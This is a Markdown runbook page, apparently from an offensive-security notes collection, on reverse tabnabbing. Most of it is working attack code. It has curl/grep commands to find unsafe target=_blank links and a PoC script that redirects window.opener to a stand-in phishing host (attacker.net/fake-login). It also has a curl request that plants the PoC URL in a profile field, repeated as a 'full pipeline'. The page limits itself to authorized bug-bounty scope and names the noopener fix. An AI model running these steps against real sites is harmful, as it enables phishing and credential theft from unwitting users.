---
title: "Reverse Tab Nabbing"
description: "Using target=_blank without rel=noopener to take control of the opening page through window.opener navigation."
phase: Web
order: 69
tags:
  - tabnabbing
  - dom
  - phishing
  - client-side
tools:
  - curl
  - browser devtools
updated: 2026-10-01
---

A reverse tabnabbing runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find a link or `window.open` to an attacker-controlled URL where `window.opener` is retained, then prove you can navigate the original tab to a phishing clone.

## 1. Enumerate links and window opens

```bash
curl -s "https://target.com/" \
  | grep -oE '<a[^>]+target="_blank"[^>]*>' \
  | grep -v 'noopener'

# Search client bundles for window.open
curl -s "https://target.com/app.js" \
  | grep -nE 'window\.open\(|target\s*=\s*["'\'']_blank'
```

Any `_blank` link without `rel="noopener"` retains `window.opener` in most browsers.

## 2. Find a user-controlled link target

Identify fields you can populate that end up as anchor hrefs or window targets: profile "website"/"author URL" fields, comment or Markdown links, OAuth/SSO popup destinations, and any "open in new tab" feature.

## 3. Build the PoC

```html
<!-- attacker.html served from a domain you control -->
<script>
  if (window.opener) {
    window.opener.location = "https://attacker.net/fake-login";
  }
</script>
```

The victim's original tab silently swaps to a page that looks like the trusted app.

## 4. Verify opener access in DevTools

```js
console.log(window.opener);              // null means protected
if (window.opener) {
  console.log(window.opener.location.href);
}
window.opener.location = "/phish";       // demonstrates control
```

```bash
python3 -m http.server 8000
# then visit http://localhost:8000/attacker.html
```

## 5. Exercise the real feature

```bash
# Set your profile website to the PoC host and click the link
curl -s -X POST "https://target.com/api/profile" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"website":"http://localhost:8000/attacker.html"}' | jq .
```

## Full pipeline

```bash
# 1. Enumerate unsafe _blank links
curl -s "https://target.com/" \
  | grep -oE '<a[^>]+target="_blank"[^>]*>' | grep -v 'noopener'

# 2. Search bundles for window.open
curl -s "https://target.com/app.js" | grep -nE 'window\.open\(|_blank'

# 3. Host the PoC
cat > attacker.html <<'HTML'
<script>
if (window.opener) { window.opener.location = "https://attacker.net/fake-login"; }
</script>
HTML
python3 -m http.server 8000

# 4. Inject the URL via a profile field
curl -s -X POST "https://target.com/api/profile" \
  -H "Cookie: session=$SESSION" -H "Content-Type: application/json" \
  -d '{"website":"http://localhost:8000/attacker.html"}'
```

## Ethics & legality

- Never host the phishing clone on infrastructure that could be mistaken for the real service.
- Use a clearly fake login page and no real credentials; demonstrate navigation only.
- Only test links and fields covered by the authorized scope.
- Confirm `rel="noopener noreferrer"` as the fix in the report.
